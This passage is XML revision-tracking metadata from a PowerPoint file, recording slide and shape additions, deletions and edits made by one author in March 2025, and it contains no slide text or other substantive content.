            <ac:picMk id="3" creationId="{D58B4926-F98A-2602-D088-E88ECA075FA3}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:45:36.508" v="674" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="752675993" sldId="515"/>
        </pc:sldMkLst>
        <pc:spChg chg="add del">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:24:14.469" v="558" actId="22"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="752675993" sldId="515"/>
            <ac:spMk id="3" creationId="{8352990A-BF64-77D6-AD07-A96A731B2D08}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:24:20.766" v="560" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="752675993" sldId="515"/>
            <ac:spMk id="5" creationId="{8F7C62CF-3A50-4BE2-0322-ACBEE63FE34D}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:45:36.508" v="674" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="752675993" sldId="515"/>
            <ac:spMk id="7" creationId="{05CFF16E-D247-D47F-E517-D3EBDD696F29}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add del mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:24:22.792" v="561" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="752675993" sldId="515"/>
            <ac:spMk id="8" creationId="{83FD1346-C0BF-BAA8-F873-EAA36A0DC851}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:27:07.793" v="590" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="752675993" sldId="515"/>
            <ac:picMk id="10" creationId="{E1C8E736-589D-A7C5-CA0A-0FE1279D360B}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:27:10.715" v="591" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="752675993" sldId="515"/>
            <ac:picMk id="12" creationId="{84E27BCA-8132-0FD2-2A8C-A1FCAC4CA91C}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:27:18.423" v="594" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="752675993" sldId="515"/>
            <ac:picMk id="14" creationId="{7B4D80E5-A18D-B9F6-6169-9EB45A103B17}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:27:23.615" v="596" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="752675993" sldId="515"/>
            <ac:picMk id="16" creationId="{131FE98F-C285-0366-3CE6-B8585FF3BE6E}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T15:54:43.932" v="1045" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3043064213" sldId="516"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T15:54:22.243" v="1040" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3043064213" sldId="516"/>
            <ac:spMk id="5" creationId="{ABA38904-00AB-2D6E-9A57-403F57989B58}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T15:54:15.332" v="1021" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3043064213" sldId="516"/>
            <ac:picMk id="3" creationId="{B74D7653-EFDA-FB7C-0843-4F32D7BA0CC5}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T15:54:43.932" v="1045" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3043064213" sldId="516"/>
            <ac:picMk id="7" creationId="{8C519C95-4DA7-1048-2C4E-96A0BFE4C0F7}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T16:32:59.795" v="1540" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4279718086" sldId="517"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T16:32:59.795" v="1540" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4279718086" sldId="517"/>
            <ac:spMk id="5" creationId="{C1320D69-8716-2160-E97D-D4DA40726D4E}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T16:15:09.251" v="1234"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4279718086" sldId="517"/>
            <ac:spMk id="6" creationId="{D7260999-55C8-37B7-4DB3-89300100AA4D}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T15:55:38.290" v="1127" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4279718086" sldId="517"/>
            <ac:picMk id="3" creationId="{967C6125-E368-878B-3D92-E1D43C2D092D}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T16:38:36.812" v="1567" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1820281243" sldId="518"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T16:18:03.200" v="1253" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1820281243" sldId="518"/>
            <ac:spMk id="4" creationId="{BE987196-8848-6C6E-521B-98FAA43F8E45}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T16:38:36.812" v="1567" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1820281243" sldId="518"/>
            <ac:spMk id="5" creationId="{F3A5F012-C15C-1EC3-A57F-3DF28D121810}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:07:33.555" v="1568" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2397649302" sldId="519"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T16:05:46.757" v="1128"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3634168848" sldId="520"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T16:08:38.582" v="1158" actId="12"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1173785866" sldId="521"/>
        </pc:sldMkLst>
        <pc:spChg chg="add del mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T16:07:20.031" v="1145" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1173785866" sldId="521"/>
            <ac:spMk id="2" creationId="{CA50195D-D0B2-C4EA-6F7D-A3D13B35093B}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T16:08:38.582" v="1158" actId="12"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1173785866" sldId="521"/>
            <ac:spMk id="3" creationId="{4E334084-6E82-AE18-A9A9-3777F0CE9508}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T16:06:00.513" v="1143" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1173785866" sldId="521"/>
            <ac:spMk id="4" creationId="{E36767EC-EB13-7B10-8D60-C93D377B8993}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T16:07:17.779" v="1144" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1173785866" sldId="521"/>
            <ac:spMk id="5" creationId="{22B5C786-5650-F2CE-9A3B-5255DABED7B6}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:07:49.662" v="1571"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1176863794" sldId="522"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:27:29.404" v="1646" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="912083773" sldId="523"/>
        </pc:sldMkLst>
        <pc:spChg chg="add mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:19:59.591" v="1608" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="912083773" sldId="523"/>
            <ac:spMk id="3" creationId="{311F6110-9043-07CC-5201-0D259A422698}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:08:20.083" v="1592"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="912083773" sldId="523"/>
            <ac:spMk id="4" creationId="{06EF86FE-61EE-04C4-52AE-AFF52DEDDF2C}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:08:54.594" v="1594" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="912083773" sldId="523"/>
            <ac:spMk id="5" creationId="{4872E3FC-78F0-9949-0433-B716A1366CF1}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add del mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:08:56.523" v="1595" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="912083773" sldId="523"/>
            <ac:spMk id="6" creationId="{B307BAF8-32BA-9C87-E89C-35EB7AE5A7A2}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:graphicFrameChg chg="add del mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:24:08.905" v="1612" actId="478"/>
          <ac:graphicFrameMkLst>
            <pc:docMk/>
            <pc:sldMk cId="912083773" sldId="523"/>
            <ac:graphicFrameMk id="9" creationId="{6027079B-A1CA-987B-4D18-50715C4ED7A7}"/>
          </ac:graphicFrameMkLst>
        </pc:graphicFrameChg>
        <pc:picChg chg="add del mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:27:13.748" v="1642" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="912083773" sldId="523"/>
            <ac:picMk id="8" creationId="{77D02821-B3C0-78BB-06D4-853BC1A23BA2}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:27:29.404" v="1646" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="912083773" sldId="523"/>
            <ac:picMk id="11" creationId="{3E69110E-C9F2-4B09-C9BD-102B310CFA18}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-20T07:36:10.141" v="1702" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2423877030" sldId="524"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-20T07:36:10.141" v="1702" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2423877030" sldId="524"/>
            <ac:spMk id="3" creationId="{B4B5C249-09BD-A433-BE18-567BE6F9B756}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:graphicFrameChg chg="mod modGraphic">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:25:41.360" v="1641" actId="20577"/>
          <ac:graphicFrameMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2423877030" sldId="524"/>
            <ac:graphicFrameMk id="9" creationId="{ABE149B2-3FF4-64A0-0033-7C42E20715F0}"/>
          </ac:graphicFrameMkLst>
        </pc:graphicFrameChg>
        <pc:picChg chg="del">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:24:12.557" v="1613" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2423877030" sldId="524"/>
            <ac:picMk id="8" creationId="{526F57F5-50C3-802D-52A6-30D2EAD6A7B6}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:30:15.322" v="1650" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1688261493" sldId="525"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:30:15.322" v="1650" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1688261493" sldId="525"/>
            <ac:spMk id="3" creationId="{AFE29CE3-815B-63A6-D050-C3EDED29BB83}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:graphicFrameChg chg="del">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:30:10.011" v="1648" actId="478"/>
          <ac:graphicFrameMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1688261493" sldId="525"/>
            <ac:graphicFrameMk id="9" creationId="{E1DCF2BE-574F-6A60-BBA8-5E02399260B6}"/>
          </ac:graphicFrameMkLst>
        </pc:graphicFrameChg>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:30:18.118" v="1651"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2734443557" sldId="526"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:30:18.467" v="1652"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1055750870" sldId="527"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:30:18.699" v="1653"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1863952922" sldId="528"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:30:19.003" v="1654"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3521681566" sldId="529"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:30:19.176" v="1655"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2651142029" sldId="530"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:30:19.403" v="1656"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1586964704" sldId="531"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:30:19.623" v="1657"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="809245518" sldId="532"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:30:56.330" v="1669" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3988245638" sldId="533"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:30:56.330" v="1669" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3988245638" sldId="533"/>
            <ac:spMk id="3" creationId="{F26A2B2F-86CB-B169-1138-87F63A81E552}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}"/>
    <pc:docChg chg="undo custSel addSld delSld">
      <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3634448043" sldId="282"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3524714974" sldId="283"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:40.890" v="2" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1611998026" sldId="284"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3650368615" sldId="285"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2064699807" sldId="286"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="823084519" sldId="296"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3274192253" sldId="307"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="265106335" sldId="308"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2060039332" sldId="314"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
